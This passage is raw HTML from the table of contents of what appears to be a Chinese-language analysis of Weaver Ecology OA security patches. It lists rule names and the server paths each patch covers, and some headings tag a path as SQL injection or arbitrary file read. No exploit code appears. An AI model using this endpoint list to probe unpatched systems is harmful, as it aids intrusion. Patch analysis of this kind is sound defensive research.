class="toc-number">2.1.8.8.</span> <span class="toc-text">SecurityRuleSQL28</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleSQL29"><span class="toc-number">2.1.8.9.</span> <span class="toc-text">SecurityRuleSQL29</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleSQL30"><span class="toc-number">2.1.8.10.</span> <span class="toc-text">SecurityRuleSQL30</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-mobile-x2F-plugin-x2F-1-x2F-html-x2F-htmlcalculate-jsp-SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.8.10.1.</span> <span class="toc-text">&#x2F;mobile&#x2F;plugin&#x2F;1&#x2F;html&#x2F;htmlcalculate.jsp SQL注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-cpt-x2F-car-x2F-carsetdataoperation2-jsp"><span class="toc-number">2.1.8.10.2.</span> <span class="toc-text">&#x2F;cpt&#x2F;car&#x2F;carsetdataoperation2.jsp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-mobile-x2F-plugin-x2F-GetMaster-jsp"><span class="toc-number">2.1.8.10.3.</span> <span class="toc-text">&#x2F;mobile&#x2F;plugin&#x2F;GetMaster.jsp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-mobile-x2F-plugin-x2F-hrm-x2F-changepassword-jsp"><span class="toc-number">2.1.8.10.4.</span> <span class="toc-text">&#x2F;mobile&#x2F;plugin&#x2F;hrm&#x2F;changepassword.jsp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-mobile-x2F-hrm-x2F-%E3%80%81cloudstore-x2F-config-xml-properties"><span class="toc-number">2.1.8.10.5.</span> <span class="toc-text">&#x2F;mobile&#x2F;hrm&#x2F;、cloudstore&#x2F;config(.xml|.properties)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20191024-v10-20"><span class="toc-number">2.1.9.</span> <span class="toc-text">Ecology_security_20191024_v10.20</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleMobile29"><span class="toc-number">2.1.9.1.</span> <span class="toc-text">SecurityRuleMobile29</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20191025-v10-21"><span class="toc-number">2.1.10.</span> <span class="toc-text">Ecology_security_20191025_v10.21</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule02"><span class="toc-number">2.1.10.1.</span> <span class="toc-text">SecurityRule02</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule39"><span class="toc-number">2.1.10.2.</span> <span class="toc-text">SecurityRule39</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForbiddenAES41"><span class="toc-number">2.1.10.3.</span> <span class="toc-text">SecurityRuleForbiddenAES41</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForbiddenMsg45"><span class="toc-number">2.1.10.4.</span> <span class="toc-text">SecurityRuleForbiddenMsg45</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleMess43"><span class="toc-number">2.1.10.5.</span> <span class="toc-text">SecurityRuleMess43</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRulePortalThumbnail40"><span class="toc-number">2.1.10.6.</span> <span class="toc-text">SecurityRulePortalThumbnail40</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#portal-x2F-sptmforportalthumbnail-jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%8C%E9%9C%80%E7%99%BB%E5%BD%95"><span class="toc-number">2.1.10.6.1.</span> <span class="toc-text">portal&#x2F;sptmforportalthumbnail.jsp 任意文件读取，需登录</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleSQL32"><span class="toc-number">2.1.10.7.</span> <span class="toc-text">SecurityRuleSQL32</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleSQL42"><span class="toc-number">2.1.10.8.</span> <span class="toc-text">SecurityRuleSQL42</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleSso44"><span class="toc-number">2.1.10.9.</span> <span class="toc-text">SecurityRuleSso44</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tips"><span class="toc-number">2.1.10.10.</span> <span class="toc-text">tips</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20191031-v10-22"><span class="toc-number">2.1.11.</span> <span class="toc-text">Ecology_security_20191031_v10.22</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule46"><span class="toc-number">2.1.11.1.</span> <span class="toc-text">SecurityRule46</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#weaver-formmode-data-filedownload"><span class="toc-number">2.1.11.1.1.</span> <span class="toc-text">weaver.formmode.data.filedownload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#weaver-file-excelout"><span class="toc-number">2.1.11.1.2.</span> <span class="toc-text">weaver.file.excelout</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20191104-v10-23"><span class="toc-number">2.1.12.</span> <span class="toc-text">Ecology_security_20191104_v10.23</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleBlog"><span class="toc-number">2.1.12.1.</span> <span class="toc-text">SecurityRuleBlog</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleCtrip"><span class="toc-number">2.1.12.2.</span> <span class="toc-text">SecurityRuleCtrip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleDBstepSQL"><span class="toc-number">2.1.12.3.</span> <span class="toc-text">SecurityRuleDBstepSQL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleDownloadNews"><span class="toc-number">2.1.12.4.</span> <span class="toc-text">SecurityRuleDownloadNews</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForAjax"><span class="toc-number">2.1.12.5.</span> <span class="toc-text">SecurityRuleForAjax</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForElementCustomServlet"><span class="toc-number">2.1.12.6.</span> <span class="toc-text">SecurityRuleForElementCustomServlet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForOutDoc"><span class="toc-number">2.1.12.7.</span> <span class="toc-text">SecurityRuleForOutDoc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForServer"><span class="toc-number">2.1.12.8.</span> <span class="toc-text">SecurityRuleForServer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleValidatenum"><span class="toc-number">2.1.12.9.</span> <span class="toc-text">SecurityRuleValidatenum</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleWeb47"><span class="toc-number">2.1.12.10.</span> <span class="toc-text">SecurityRuleWeb47</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleWeb49"><span class="toc-number">2.1.12.11.</span> <span class="toc-text">SecurityRuleWeb49</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleWeb50"><span class="toc-number">2.1.12.12.</span> <span class="toc-text">SecurityRuleWeb50</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleWeb51"><span class="toc-number">2.1.12.13.</span> <span class="toc-text">SecurityRuleWeb51</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleWeb52"><span class="toc-number">2.1.12.14.</span> <span class="toc-text">SecurityRuleWeb52</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-weaver-file-SignatureDownLoad"><span class="toc-number">2.1.12.14.1.</span> <span class="toc-text">&#x2F;weaver.file.SignatureDownLoad</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-weaver-docs-docs-ShowDocsImageServlet"><span class="toc-number">2.1.12.14.2.</span> <span class="toc-text">&#x2F;weaver.docs.docs.ShowDocsImageServlet</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-weaver-file-networkdisk-NetworkDiskFileDownload"><span class="toc-number">2.1.12.14.3.</span> <span class="toc-text">&#x2F;weaver.file.networkdisk.NetworkDiskFileDownload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20200511-v10-25"><span class="toc-number">2.1.13.</span> <span class="toc-text">Ecology_security_20200511_v10.25</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LRFFieldLog"><span class="toc-number">2.1.13.1.</span> <span class="toc-text">LRFFieldLog</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule051"><span class="toc-number">2.1.13.2.</span> <span class="toc-text">SecurityRule051</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleCloudstoreControlServlet"><span class="toc-number">2.1.13.3.</span> <span class="toc-text">SecurityRuleCloudstoreControlServlet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleCommForbidden"><span class="toc-number">2.1.13.4.</span> <span class="toc-text">SecurityRuleCommForbidden</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleCheckPageRight"><span class="toc-number">2.1.13.5.</span> <span class="toc-text">SecurityRuleCheckPageRight</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleCreateDB"><span class="toc-number">2.1.13.6.</span> <span class="toc-text">SecurityRuleCreateDB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleDataSel053"><span class="toc-number">2.1.13.7.</span> <span class="toc-text">SecurityRuleDataSel053</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-page-x2F-exportimport-x2F-uploadoperation-jsp"><span class="toc-number">2.1.13.7.1.</span> <span class="toc-text">&#x2F;page&#x2F;exportimport&#x2F;uploadoperation.jsp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-js-x2F-hrm-x2F-getdata-jsp"><span class="toc-number">2.1.13.7.2.</span> <span class="toc-text">&#x2F;js&#x2F;hrm&#x2F;getdata.jsp</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleDocLogQX"><span class="toc-number">2.1.13.8.</span> <span class="toc-text">SecurityRuleDocLogQX</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#report-x2F-rpmodifydoc-jsp"><span class="toc-number">2.1.13.8.1.</span> <span class="toc-text">report&#x2F;rpmodifydoc.jsp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#docs-x2F-docs-x2F-docdownloadlog-jsp"><span class="toc-number">2.1.13.8.2.</span> <span class="toc-text">docs&#x2F;docs&#x2F;docdownloadlog.jsp</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleFileDownload"><span class="toc-number">2.1.13.9.</span> <span class="toc-text">SecurityRuleFileDownload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleFilesystem"><span class="toc-number">2.1.13.10.</span> <span class="toc-text">SecurityRuleFilesystem</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForbiddenswf-F8018"><span class="toc-number">2.1.13.11.</span> <span class="toc-text">SecurityRuleForbiddenswf_F8018</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForbiddenTest017"><span class="toc-number">2.1.13.12.</span> <span class="toc-text">SecurityRuleForbiddenTest017</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForbiddenUrlForE9"><span class="toc-number">2.1.13.13.</span> <span class="toc-text">SecurityRuleForbiddenUrlForE9</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForFormmodeAction"><span class="toc-number">2.1.13.14.</span> <span class="toc-text">SecurityRuleForFormmodeAction</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForGetDataList"><span class="toc-number">2.1.13.15.</span> <span class="toc-text">SecurityRuleForGetDataList</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForUeditor"><span class="toc-number">2.1.13.16.</span> <span class="toc-text">SecurityRuleForUeditor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleGetBody"><span class="toc-number">2.1.13.17.</span> <span class="toc-text">SecurityRuleGetBody</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleLicense052"><span class="toc-number">2.1.13.18.</span> <span class="toc-text">SecurityRuleLicense052</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleQueryPost"><span class="toc-number">2.1.13.19.</span> <span class="toc-text">SecurityRuleQueryPost</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleRandomCode"><span class="toc-number">2.1.13.20.</span> <span class="toc-text">SecurityRuleRandomCode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleRteUploader"><span class="toc-number">2.1.13.21.</span> <span class="toc-text">SecurityRuleRteUploader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleUeditorMapForbbiden"><span class="toc-number">2.1.13.22.</span> <span class="toc-text">SecurityRuleUeditorMapForbbiden</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleWhiteExtName"><span class="toc-number">2.1.13.23.</span> <span class="toc-text">SecurityRuleWhiteExtName</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleWhiteIp030"><span class="toc-number">2.1.13.24.</span> <span class="toc-text">SecurityRuleWhiteIp030</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SkipSecurityCheckForLan"><span class="toc-number">2.1.13.25.</span> <span class="toc-text">SkipSecurityCheckForLan</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology9-00-2008-09-%E2%80%93-v10-27"><span class="toc-number">2.1.14.</span> <span class="toc-text">Ecology9.00.2008.09 – v10.27</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleCubeFormCheckVsql"><span class="toc-number">2.1.14.1.</span> <span class="toc-text">SecurityRuleCubeFormCheckVsql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleFileDown054"><span class="toc-number">2.1.14.2.</span> <span class="toc-text">SecurityRuleFileDown054</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-hrm-x2F-pit-x2F-recordManager-x2F-downloadFile"><span class="toc-number">2.1.14.2.1.</span> <span class="toc-text">&#x2F;api&#x2F;hrm&#x2F;pit&#x2F;recordManager&#x2F;downloadFile</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleFileDown055"><span class="toc-number">2.1.14.3.</span> <span class="toc-text">SecurityRuleFileDown055</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#api-x2F-edc-x2F-report-x2F-board-x2F-downEdcfiled"><span class="toc-number">2.1.14.3.1.</span> <span class="toc-text">api&#x2F;edc&#x2F;report&#x2F;board&#x2F;downEdcfiled</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleFileDown056"><span class="toc-number">2.1.14.4.</span> <span class="toc-text">SecurityRuleFileDown056</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-ec-x2F-dev-x2F-table-x2F-downfiledata"><span class="toc-number">2.1.14.4.1.</span> <span class="toc-text">&#x2F;api&#x2F;ec&#x2F;dev&#x2F;table&#x2F;downfiledata</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForbidden061"><span class="toc-number">2.1.14.5.</span> <span class="toc-text">SecurityRuleForbidden061</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-ec-x2F-dev-x2F-help-x2F-uploadxml"><span class="toc-number">2.1.14.5.1.</span> <span class="toc-text">&#x2F;api&#x2F;ec&#x2F;dev&#x2F;help&#x2F;uploadxml</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForLogOperation"><span class="toc-number">2.1.14.6.</span> <span class="toc-text">SecurityRuleForLogOperation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#logMonitor-x2F-logoperation-jsp"><span class="toc-number">2.1.14.6.1.</span> <span class="toc-text">logMonitor&#x2F;logoperation.jsp</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleMap"><span class="toc-number">2.1.14.7.</span> <span class="toc-text">SecurityRuleMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleProtalWeb01"><span class="toc-number">2.1.14.8.</span> <span class="toc-text">SecurityRuleProtalWeb01</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-portal-x2F-materialLib-x2F-downloadFile"><span class="toc-number">2.1.14.8.1.</span> <span class="toc-text">&#x2F;api&#x2F;portal&#x2F;materialLib&#x2F;downloadFile</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleTempData"><span class="toc-number">2.1.14.9.</span> <span class="toc-text">SecurityRuleTempData</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleUser059"><span class="toc-number">2.1.14.10.</span> <span class="toc-text">SecurityRuleUser059</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology9-00-2011-09-%E2%80%93-v10-32"><span class="toc-number">2.1.15.</span> <span class="toc-text">Ecology9.00.2011.09 – v10.32</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuelForRest"><span class="toc-number">2.1.15.1.</span> <span class="toc-text">SecurityRuelForRest</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-rest-x2F-ofs-x2F"><span class="toc-number">2.1.15.1.1.</span> <span class="toc-text">&#x2F;rest&#x2F;ofs&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-login-x2F-verifyrtxclientlogin-jsp"><span class="toc-number">2.1.15.1.2.</span> <span class="toc-text">&#x2F;login&#x2F;verifyrtxclientlogin.jsp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-login-x2F-verifyssologin-jsp"><span class="toc-number">2.1.15.1.3.</span> <span class="toc-text">&#x2F;login&#x2F;verifyssologin.jsp</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleDot0180"><span class="toc-number">2.1.15.2.</span> <span class="toc-text">SecurityRuleDot0180</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleFieldBrowser1201"><span class="toc-number">2.1.15.3.</span> <span class="toc-text">SecurityRuleFieldBrowser1201</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleSso45"><span class="toc-number">2.1.15.4.</span> <span class="toc-text">SecurityRuleSso45</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology9-00-2011-09-%E2%80%93-v10-39"><span class="toc-number">2.1.16.</span> <span class="toc-text">Ecology9.00.2011.09 – v10.39</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuelForSQL10413"><span class="toc-number">2.1.16.1.</span> <span class="toc-text">SecurityRuelForSQL10413</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-mobilemode-x2F-action-jsp%E3%80%90%E9%9C%80%E8%A6%81%E7%99%BB%E5%BD%95%E3%80%91"><span class="toc-number">2.1.16.1.1.</span> <span class="toc-text">&#x2F;mobilemode&#x2F;action.jsp【需要登录】</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-integration-x2F-simplesso-x2F-getuserbyworkcode"><span class="toc-number">2.1.16.1.2.</span> <span class="toc-text">&#x2F;api&#x2F;integration&#x2F;simplesso&#x2F;getuserbyworkcode</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule051-1"><span class="toc-number">2.1.16.2.</span> <span class="toc-text">SecurityRule051</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule16"><span class="toc-number">2.1.16.3.</span> <span class="toc-text">SecurityRule16</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule24FormActionJsp-1"><span class="toc-number">2.1.16.4.</span> <span class="toc-text">SecurityRule24FormActionJsp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule34-1"><span class="toc-number">2.1.16.5.</span> <span class="toc-text">SecurityRule34</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule35-1"><span class="toc-number">2.1.16.6.</span> <span class="toc-text">SecurityRule35</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule36-1"><span class="toc-number">2.1.16.7.</span> <span class="toc-text">SecurityRule36</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule39-1"><span class="toc-number">2.1.16.8.</span> <span class="toc-text">SecurityRule39</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule46-1"><span class="toc-number">2.1.16.9.</span> <span class="toc-text">SecurityRule46</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleBlog-1"><span class="toc-number">2.1.16.10.</span> <span class="toc-text">SecurityRuleBlog</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-blogoperation-jsp"><span class="toc-number">2.1.16.10.1.</span> <span class="toc-text">* &#x2F;blogoperation.jsp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#api-x2F-blog-x2F-base-x2F-saveorupdateblog"><span class="toc-number">2.1.16.10.2.</span> <span class="toc-text">api&#x2F;blog&#x2F;base&#x2F;saveorupdateblog</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleCloudstoreControlServlet-1"><span class="toc-number">2.1.16.11.</span> <span class="toc-text">SecurityRuleCloudstoreControlServlet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleCRTDir"><span class="toc-number">2.1.16.12.</span> <span class="toc-text">SecurityRuleCRTDir</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleCtrip-1"><span class="toc-number">2.1.16.13.</span> <span class="toc-text">SecurityRuleCtrip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleDir"><span class="toc-number">2.1.16.14.</span> <span class="toc-text">SecurityRuleDir</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleDocLogQX-1"><span class="toc-number">2.1.16.15.</span> <span class="toc-text">SecurityRuleDocLogQX</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#report-x2F-rpmodifydoc"><span class="toc-number">2.1.16.15.1.</span> <span class="toc-text">report&#x2F;rpmodifydoc</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#docs-x2F-docs-x2F-docdownloadlog-jsp-1"><span class="toc-number">2.1.16.15.2.</span> <span class="toc-text">docs&#x2F;docs&#x2F;docdownloadlog.jsp</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleDownloadNews-1"><span class="toc-number">2.1.16.16.</span> <span class="toc-text">SecurityRuleDownloadNews</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-weaver-x2F-weaver-file-filedownloadfornews"><span class="toc-number">2.1.16.16.1.</span> <span class="toc-text">&#x2F;weaver&#x2F;weaver.file.filedownloadfornews</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-weaver-x2F-weaver-email-FileDownloadLocation"><span class="toc-number">2.1.16.16.2.</span> <span class="toc-text">&#x2F;weaver&#x2F;weaver.email.FileDownloadLocation</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-weaver-x2F-weaver-homepage-HomepageCreateImage"><span class="toc-number">2.1.16.16.3.</span> <span class="toc-text">&#x2F;weaver&#x2F;weaver.homepage.HomepageCreateImage</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleDUpload"><span class="toc-number">2.1.16.17.</span> <span class="toc-text">SecurityRuleDUpload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleFieldBrowser1201-1"><span class="toc-number">2.1.16.18.</span> <span class="toc-text">SecurityRuleFieldBrowser1201</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleFileDown056-1"><span class="toc-number">2.1.16.19.</span> <span class="toc-text">SecurityRuleFileDown056</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-ec-x2F-dev-x2F-table-x2F-cleartemp"><span class="toc-number">2.1.16.19.1.</span> <span class="toc-text">&#x2F;api&#x2F;ec&#x2F;dev&#x2F;table&#x2F;cleartemp</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForbidden060"><span class="toc-number">2.1.16.20.</span> <span class="toc-text">SecurityRuleForbidden060</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-ec-x2F-tool-x2F-validate-x2F-check"><span class="toc-number">2.1.16.20.1.</span> <span class="toc-text">&#x2F;api&#x2F;ec&#x2F;tool&#x2F;validate&#x2F;check</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForbiddenExamples"><span class="toc-number">2.1.16.21.</span> <span class="toc-text">SecurityRuleForbiddenExamples</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForDir"><span class="toc-number">2.1.16.22.</span> <span class="toc-text">SecurityRuleForDir</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#mobilemode-x2F-showdata-jsp"><span class="toc-number">2.1.16.22.1.</span> <span class="toc-text">mobilemode&#x2F;showdata.jsp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#jqueryfiletree-jsp"><span class="toc-number">2.1.16.22.2.</span> <span class="toc-text">jqueryfiletree.jsp</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForFastJsonSafeMode"><span class="toc-number">2.1.16.23.</span> <span class="toc-text">SecurityRuleForFastJsonSafeMode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleMLogin"><span class="toc-number">2.1.16.24.</span> <span class="toc-text">SecurityRuleMLogin</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#mobile-x2F-plugin-x2F-verifyquicklogin-jsp"><span class="toc-number">2.1.16.24.1.</span> <span class="toc-text">mobile&#x2F;plugin&#x2F;verifyquicklogin.jsp</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleMobile29-1"><span class="toc-number">2.1.16.25.</span> <span class="toc-text">SecurityRuleMobile29</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleNeedLogin"><span class="toc-number">2.1.16.26.</span> <span class="toc-text">SecurityRuleNeedLogin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleNet48"><span class="toc-number">2.1.16.27.</span> <span class="toc-text">SecurityRuleNet48</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-docs-x2F-networkdisk-x2F-adddownloadfiletemp-jsp"><span class="toc-number">2.1.16.27.1.</span> <span class="toc-text">&#x2F;docs&#x2F;networkdisk&#x2F;adddownloadfiletemp.jsp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-docs-x2F-networkdisk-x2F-createsyncfolder-jsp"><span class="toc-number">2.1.16.27.2.</span> <span class="toc-text">&#x2F;docs&#x2F;networkdisk&#x2F;createsyncfolder.jsp</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRulePageTemplateLoginOperate"><span class="toc-number">2.1.16.28.</span> <span class="toc-text">SecurityRulePageTemplateLoginOperate</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#page-x2F-maint-x2F-template-x2F-login-news-x2F-operate-jsp"><span class="toc-number">2.1.16.28.1.</span> <span class="toc-text">page&#x2F;maint&#x2F;template&#x2F;(login||news)&#x2F;operate.jsp</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleSIS"><span class="toc-number">2.1.16.29.</span> <span class="toc-text">SecurityRuleSIS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleSso44-1"><span class="toc-number">2.1.16.30.</span> <span class="toc-text">SecurityRuleSso44</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleThemeOperation"><span class="toc-number">2.1.16.31.</span> <span class="toc-text">SecurityRuleThemeOperation</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XfireServletSecurityRule"><span class="toc-number">2.1.16.32.</span> <span class="toc-text">XfireServletSecurityRule</span></a></li></ol></li><li class="toc-item toc-level-3"><a 